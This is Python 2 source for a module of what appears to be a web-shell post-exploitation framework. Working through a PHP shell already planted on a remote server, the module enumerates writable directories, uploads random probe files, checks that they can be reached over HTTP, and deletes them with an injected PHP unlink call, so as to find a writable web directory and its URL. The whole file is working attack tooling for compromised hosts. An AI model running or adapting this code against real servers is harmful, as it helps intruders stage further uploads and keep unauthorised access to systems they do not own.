'''
Created on 28/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P
from random import choice
from string import letters
from core.http.request import Request
from urlparse import urlparse

classname = 'Webdir'
    
class Webdir(Module):
    """
    TODO: the check if dir is writable is unnecessary, or 
    to move in file.check
    """
    

    params = ParametersList('Find a writable directory and corresponding URL',  [],
                    P(arg='rpath', help='Remote directory or \'find\' automatically', default='find', pos=0))
    
    
    def __init__( self, modhandler , url, password):

        self.dir = None
        self.url = None
        
        self.probe_filename = ''.join(choice(letters) for i in xrange(4)) + '.html'

        Module.__init__(self, modhandler, url, password)
        
    
    def __upload_file_content(self, content, rpath):
        self.modhandler.load('file.upload').set_file_content(content)
        self.modhandler.set_verbosity(6)
        response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath })
        self.modhandler.set_verbosity()
        
        return response


    def __check_remote_test_file(self, file_path):
        
        return self.modhandler.load('file.check').run({'rpath' : file_path, 'mode' : 'exists'})


    def __check_remote_test_url(self, file_url):
        
        file_content = Request(file_url).read()
        
        if( file_content == '1'):
            return True
            

    def __remove_remote_test_file(self, file_path):
        
        if self.modhandler.load('shell.php').run( { 0 : "unlink('%s') && print('1');" % file_path }) != '1':
            self.mprint("[!] [find.webdir] Error cleaning test file %s" % (file_path))
            
                
                        
    def __enumerate_writable_dirs(self, root_dir):

        if not root_dir[-1]=='/': 
            root_dir += '/'
        
        try:
            writable_dirs_string = self.modhandler.load('find.perms').run({'qty' :  'any','type' : 'd', 'perm' : 'w', 'rpath' : root_dir })
            writable_dirs = [ d for d in writable_dirs_string.split('\n') if d]
        except ModuleException as e:
            self.mprint('[!] [' + e.module + '] ' + e.error)
            writable_dirs = []
            
        return writable_dirs
           

    def run_module(self, path):

        
        if self.url and self.dir:
            self.mprint("[%s] Writable web dir: %s -> %s" % (self.name, self.dir, self.url))
            return
        
        start_path = None
        
        if path == 'find':
            try:
                start_path = self.modhandler.load('system.info').run({ 0 : 'basedir' })
            except ModuleException, e:
                self.mprint('[!] [' + e.module + '] ' + e.error)

        else:
            start_path = path
        
        http_root = '%s://%s/' % (urlparse(self.url).scheme, urlparse(self.url).netloc) 
        
        
        if start_path:
            
            writable_dirs = self.__enumerate_writable_dirs(start_path)

            for dir_path in writable_dirs:

                
                if not dir_path[-1]=='/': 
                    dir_path += '/'
                
                file_path = dir_path + self.probe_filename
    
                file_url = http_root + file_path.replace(start_path,'')
                dir_url = http_root + dir_path.replace(start_path,'')
            
            
                if self.__upload_file_content('1', file_path) and self.__check_remote_test_file(file_path) and self.__check_remote_test_url(file_url):
                    
                    self.dir = dir_path
                    self.url = dir_url
                    
                self.__remove_remote_test_file(file_path)
                
                if self.dir and self.url:
                   self.mprint("[find.webdir] Found writable web dir %s -> %s" % (self.dir, self.url))
                   return True
        
        raise ModuleException(self.name,  "Writable web directory not found")